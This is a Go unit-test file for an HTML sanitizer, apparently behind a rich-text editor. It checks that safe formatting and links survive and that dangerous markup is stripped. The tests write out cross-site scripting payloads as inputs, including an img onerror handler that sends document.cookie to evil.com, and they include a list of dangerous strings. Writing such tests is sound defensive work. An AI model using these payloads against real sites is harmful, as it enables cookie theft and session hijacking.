package main

import (
	"html/template"
	"strings"
	"testing"
)

func TestSafeContent_EmptyString(t *testing.T) {
	result := SafeContent("")
	if result != template.HTML("") {
		t.Errorf("expected empty HTML, got %q", result)
	}
}

func TestSafeContent_Whitespace(t *testing.T) {
	result := SafeContent("   \n\t  ")
	if result != template.HTML("") {
		t.Errorf("expected empty HTML for whitespace input, got %q", result)
	}
}

func TestSafeContent_PlainText(t *testing.T) {
	result := SafeContent("Hello world")
	if result != template.HTML("Hello world") {
		t.Errorf("expected escaped plain text, got %q", result)
	}
}

func TestSafeContent_PlainTextWithSpecialChars(t *testing.T) {
	result := SafeContent("5 > 3 & 2 < 4")
	s := string(result)
	if strings.Contains(s, "<") || strings.Contains(s, ">") || strings.Contains(s, "&4") {
		t.Errorf("expected HTML-escaped output, got %q", s)
	}
	if !strings.Contains(s, "&gt;") || !strings.Contains(s, "&lt;") || !strings.Contains(s, "&amp;") {
		t.Errorf("expected HTML entities, got %q", s)
	}
}

func TestSafeContent_SafeHTML(t *testing.T) {
	input := "<p>Hello <strong>world</strong></p>"
	result := SafeContent(input)
	s := string(result)
	if !strings.Contains(s, "<p>") {
		t.Errorf("expected <p> to survive, got %q", s)
	}
	if !strings.Contains(s, "<strong>") {
		t.Errorf("expected <strong> to survive, got %q", s)
	}
}

func TestSafeContent_ScriptTag_Stripped(t *testing.T) {
	input := "<p>Hello</p><script>alert('xss')</script>"
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "<script>") {
		t.Errorf("SECURITY: <script> tag was NOT stripped! Output: %q", s)
	}
	if strings.Contains(s, "alert") {
		t.Errorf("SECURITY: script content was NOT stripped! Output: %q", s)
	}
	if !strings.Contains(s, "<p>Hello</p>") {
		t.Errorf("expected safe content to survive, got %q", s)
	}
}

func TestSafeContent_ImgOnerror_Stripped(t *testing.T) {
	input := `<img onerror="alert(document.cookie)" src="x">`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "onerror") {
		t.Errorf("SECURITY: onerror attribute was NOT stripped! Output: %q", s)
	}
	if strings.Contains(s, "alert") {
		t.Errorf("SECURITY: alert was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_OnclickEvent_Stripped(t *testing.T) {
	input := `<a onclick="alert(1)" href="https://example.com">Click</a>`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "onclick") {
		t.Errorf("SECURITY: onclick attribute was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_JavascriptHref_Stripped(t *testing.T) {
	input := `<a href="javascript:alert(1)">Click</a>`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "javascript:") {
		t.Errorf("SECURITY: javascript: protocol was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_IframeTag_Stripped(t *testing.T) {
	input := `<iframe src="https://evil.com"></iframe>`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "<iframe") {
		t.Errorf("SECURITY: <iframe> was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_StyleTag_Stripped(t *testing.T) {
	input := `<style>body{background:red}</style><p>Hi</p>`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "<style>") {
		t.Errorf("SECURITY: <style> tag was NOT stripped! Output: %q", s)
	}
	if !strings.Contains(s, "<p>Hi</p>") {
		t.Errorf("expected safe content to survive, got %q", s)
	}
}

func TestSafeContent_FormTag_Stripped(t *testing.T) {
	input := `<form action="https://evil.com/steal"><input type="text" name="password"></form>`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "<form") {
		t.Errorf("SECURITY: <form> was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_ObjectEmbed_Stripped(t *testing.T) {
	input := `<object data="evil.swf"></object><embed src="evil.swf">`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "<object") || strings.Contains(s, "<embed") {
		t.Errorf("SECURITY: <object>/<embed> was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_QuillRichContent_Preserved(t *testing.T) {
	input := `<p><strong>Bold</strong> and <em>italic</em> and <u>underline</u></p>
<ul><li>Item 1</li><li>Item 2</li></ul>
<ol><li>Ordered 1</li></ol>
<blockquote>A quote</blockquote>
<pre>code block</pre>
<h2>Heading</h2>`

	result := SafeContent(input)
	s := string(result)

	expected := []string{"<strong>", "<em>", "<u>", "<ul>", "<li>", "<ol>", "<blockquote>", "<pre>", "<h2>"}
	for _, tag := range expected {
		if !strings.Contains(s, tag) {
			t.Errorf("expected Quill tag %s to survive sanitization, output: %q", tag, s)
		}
	}
}

func TestSafeContent_LinksPreserved(t *testing.T) {
	input := `<p>Visit <a href="https://example.com" target="_blank">link</a></p>`
	result := SafeContent(input)
	s := string(result)
	if !strings.Contains(s, "https://example.com") {
		t.Errorf("expected safe link to survive, got %q", s)
	}
	if !strings.Contains(s, "<a ") {
		t.Errorf("expected <a> tag to survive, got %q", s)
	}
}

func TestSafeContent_ImagesPreserved(t *testing.T) {
	// Images with safe src should be allowed
	input := `<p><img src="https://example.com/photo.jpg" alt="photo"></p>`
	result := SafeContent(input)
	s := string(result)
	if !strings.Contains(s, "<img") {
		t.Errorf("expected safe <img> to survive, got %q", s)
	}
	if !strings.Contains(s, "https://example.com/photo.jpg") {
		t.Errorf("expected safe src to survive, got %q", s)
	}
}

func TestSafeContent_SVGOnload_Stripped(t *testing.T) {
	input := `<svg onload="alert(1)"><circle r="50"/></svg>`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "onload") {
		t.Errorf("SECURITY: onload attribute was NOT stripped! Output: %q", s)
	}
	if strings.Contains(s, "alert") {
		t.Errorf("SECURITY: alert was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_DataURI_Stripped(t *testing.T) {
	input := `<img src="data:text/html,<script>alert(1)</script>">`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "data:text/html") {
		t.Errorf("SECURITY: data: URI with text/html was NOT stripped! Output: %q", s)
	}
}

func TestSafeContent_NestedScripts_Stripped(t *testing.T) {
	input := `<div><p>Safe</p><div><script>alert(1)</script></div></div>`
	result := SafeContent(input)
	s := string(result)
	if strings.Contains(s, "<script>") {
		t.Errorf("SECURITY: nested <script> was NOT stripped! Output: %q", s)
	}
	if !strings.Contains(s, "Safe") {
		t.Errorf("expected safe text to survive, got %q", s)
	}
}

func TestSafeContent_MultipleAttackVectors(t *testing.T) {
	// Combined attack: script + event handler + javascript: href
	input := `<p>Safe text</p>
<script>document.location='https://evil.com'</script>
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
<a href="javascript:void(0)" onclick="alert(1)">click</a>
<iframe src="https://evil.com/phishing"></iframe>`

	result := SafeContent(input)
	s := string(result)

	dangers := []string{"<script>", "onerror", "onclick", "javascript:", "<iframe", "document.location", "document.cookie", "fetch("}
	for _, d := range dangers {
		if strings.Contains(s, d) {
			t.Errorf("SECURITY: %q was NOT stripped! Output: %q", d, s)
		}
	}

	if !strings.Contains(s, "Safe text") {
		t.Errorf("expected safe text to survive, got %q", s)
	}
}
